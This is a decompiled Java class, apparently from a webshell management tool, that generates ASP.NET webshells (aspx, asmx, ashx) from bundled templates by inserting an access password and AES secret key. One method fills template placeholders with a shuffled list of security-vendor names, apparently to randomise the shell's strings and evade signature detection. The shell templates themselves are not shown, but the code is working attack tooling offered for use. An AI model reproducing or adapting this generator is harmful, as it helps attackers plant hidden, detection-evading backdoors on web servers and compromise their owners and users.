//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package shells.cryptions.cshapAes;

import core.ui.component.dialog.GOptionPane;
import java.awt.Component;
import java.io.InputStream;
import java.util.Random;
import javax.swing.Icon;
import util.Log;
import util.functions;

class Generate {
    private static final String[] SUFFIX = new String[]{"aspx", "asmx", "ashx"};

    Generate() {
    }

    public static byte[] GenerateShellLoder(String shellName, String pass, String secretKey, boolean isBin) {
        byte[] data = null;

        try {
            InputStream inputStream = Generate.class.getResourceAsStream("template/" + shellName + (isBin ? "raw.bin" : "base64.bin"));
            String code = new String(functions.readInputStream(inputStream));
            inputStream.close();
            code = code.replace("{pass}", pass).replace("{secretKey}", secretKey);
            Object selectedValue = GOptionPane.showInputDialog((Component)null, "suffix", "selected suffix", 1, (Icon)null, SUFFIX, (Object)null);
            if (selectedValue != null) {
                String suffix = (String)selectedValue;
                inputStream = Generate.class.getResourceAsStream("template/shell." + suffix);
                String template = new String(functions.readInputStream(inputStream));
                inputStream.close();
                template = template.replace("{code}", code);
                data = template.getBytes();
            }
        } catch (Exception var10) {
            Exception e = var10;
            Log.error(e);
        }

        return data;
    }

    public static byte[] GenerateShellLoderdata(String pass, String secretKey, String className) {
        byte[] data = null;

        try {
            InputStream inputStream = Generate.class.getResourceAsStream("template/" + className + ".bin");
            String code = new String(functions.readInputStream(inputStream));
            inputStream.close();

            String[] arr = { "qianxin", "nsfocus", "sangfor", "dbappsecurity", "chaitin", "damddos", "alibaba", "baidu" ,"leadsec", "venustech",
                    "asiainfosec","qingteng","threatbook","antiy","dptech","hillstonenet","topsec","huawei","sina","webray",
                    "tencent","bytedance","douyin","westone"};
            shuffle(arr);
            //System.out.println(arr[1]+arr[2]);
            //System.out.println(code);
            code = code.replace("{pass}", functions.base64EncodeToString(pass.getBytes())).replace("{secretKey}", functions.base64EncodeToString(secretKey.getBytes()))
                    .replace("{stryi}", arr[0]).replace("{strer}", arr[1])
                    .replace("{strsan}", arr[2]).replace("{strsi}", arr[3])
                    .replace("{strwu}", arr[4]).replace("{strliu}", arr[5])
                    .replace("{strqi}", arr[6]).replace("{strba}", arr[7])
                    .replace("{strjiu}", arr[8]).replace("{strshi}", arr[9])
                    .replace("{strshiyi}", arr[10]).replace("{strshier}", arr[11])
                    .replace("{strshisan}", arr[12]).replace("{strshisi}", arr[13])
                    .replace("{strshiwu}", arr[14]).replace("{strshiliu}", arr[15])
                    .replace("{strshiqi}", arr[16]).replace("{strshiba}", arr[17])
                    .replace("{strshijiu}", arr[18]).replace("{strershi}", arr[19])
                    .replace("{strershiyi}", arr[20]).replace("{strershier}", arr[21])
                    .replace("{strershisan}", arr[22]).replace("{strershisi}", arr[23]);

            //System.out.println(code);
            Object selectedValue = GOptionPane.showInputDialog((Component)null, "suffix", "selected suffix", 1, (Icon)null, SUFFIX, (Object)null);
            if (selectedValue != null) {
                String suffix = (String)selectedValue;
                inputStream = Generate.class.getResourceAsStream("template/shell." + suffix);
                String template = new String(functions.readInputStream(inputStream));
                inputStream.close();
                template = template.replace("{code}", code);
                data = template.getBytes();
            }
        } catch (Exception var10) {
            Exception e = var10;
            Log.error(e);
        }

        return data;
    }

    public static byte[] GenerateShellLoder(String pass, String secretKey, boolean isBin) {
        return GenerateShellLoder("", pass, secretKey, isBin);
    }

    public static byte[] GenerateShellLoderByAsmx(String shellName, String pass, String secretKey) {
        byte[] data = null;

        try {
            InputStream inputStream = Generate.class.getResourceAsStream("template/" + shellName + "shellAsmx.asmx");
            String code = new String(functions.readInputStream(inputStream));
            inputStream.close();
            code = code.replace("{pass}", pass).replace("{secretKey}", secretKey);
            return code.getBytes();
        } catch (Exception var6) {
            Exception e = var6;
            Log.error(e);
            return (byte[])data;
        }
    }

    public static byte[] GenerateShellLoderByAsmx(String pass, String secretKey) {
        return GenerateShellLoderByAsmx("", pass, secretKey);
    }
    private static Random rand = new Random();

    public static <T> void swap(T[] a, int i, int j) {
        T temp = a[i];
        a[i] = a[j];
        a[j] = temp;
    }

    public static <T> void shuffle(T[] arr) {
        int length = arr.length;
        for (int i = length; i > 0; i--) {
            int randInd = rand.nextInt(i);
            swap(arr, randInd, i - 1);
        }
    }
}
